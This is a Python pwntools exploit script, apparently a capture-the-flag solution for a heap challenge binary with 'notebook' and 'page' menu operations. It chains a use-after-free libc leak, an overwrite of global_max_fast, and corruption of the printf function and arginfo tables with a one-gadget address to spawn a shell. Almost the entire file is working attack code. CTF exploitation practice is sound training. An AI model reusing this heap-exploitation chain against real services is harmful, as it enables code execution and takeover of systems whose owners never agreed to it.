#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 12345 ./main
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./main')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'localhost'
port = int(args.PORT or 12345)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *show_page+113
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

sla = io.sendlineafter
sa = io.sendafter

def new_notebook(): # malloc(0x2000)
    sla('> ','1')

def edit_notebook(cnt):
    sla('> ','2')
    sa(':\n',str(cnt))

def delete_notebook(): # UAF
    sla('> ','3')

def show_notebook(): 
    sla('> ','4')

def new_page(sz): # >0x600
    sla('> ','5')
    sa(':\n',str(sz))

def edit_page(idx,cnt):
    sla('> ','6')
    sla(':\n',str(idx))
    sa(':\n',str(cnt))

def delete_page(idx):
    sla('> ','7')
    sla(':\n',str(idx))

def show_page(idx):
    sla('> ','8')
    sla(':\n',str(idx))

def fmtoff(c):
    return (ord(c) - 0x2) * 0x8

def fastoff(x):
    return (x - arena_off - 0x8) * 2

libc = exe.libc

maxfast_off = libc.sym['global_max_fast']
arena_off = libc.sym['main_arena']
printf_argtab_off = libc.sym['__printf_arginfo_table']
printf_functab_off = libc.sym['__printf_function_table']
iostdout_off = libc.sym['_IO_2_1_stdout_']
onegadget_off = 0x4f302

log.info('Arena libc off: ' + hex(arena_off))
log.info('Maxfast libc off: ' + hex(maxfast_off))
log.info('Printf argtab libc off: ' + hex(printf_argtab_off))
log.info('Printf functab libc off: ' + hex(printf_functab_off))
log.info('Iostdout libc off: ' + hex(iostdout_off))
log.info('Onegadget libc off: ' + hex(onegadget_off))

print fastoff(printf_argtab_off)


new_notebook()
new_page(0x600)
delete_notebook()
show_notebook()
io.recvuntil('OUTPUT: ')
libc.address = u64(io.recv(6) +'\x00\x00') - 0x3ebca0
print hex(libc.address)
print hex(libc.sym['global_max_fast'])
print hex(libc.sym['__free_hook'])

delete_page(0)

new_notebook()
new_page(fastoff(printf_functab_off)) # 0
new_page(fastoff(printf_argtab_off)) # 1
new_page(fastoff(iostdout_off + 0x8 * 7))
new_page(fastoff(iostdout_off + 0x8 * 5))

delete_notebook()
print hex(libc.address + onegadget_off)
edit_page(1,b'a' * fmtoff('s') + p64(libc.address + onegadget_off))

edit_notebook(p64(0)+p64(libc.sym['global_max_fast']-16))

new_notebook()

delete_page(0)
delete_page(1)

show_page(2)

io.interactive()

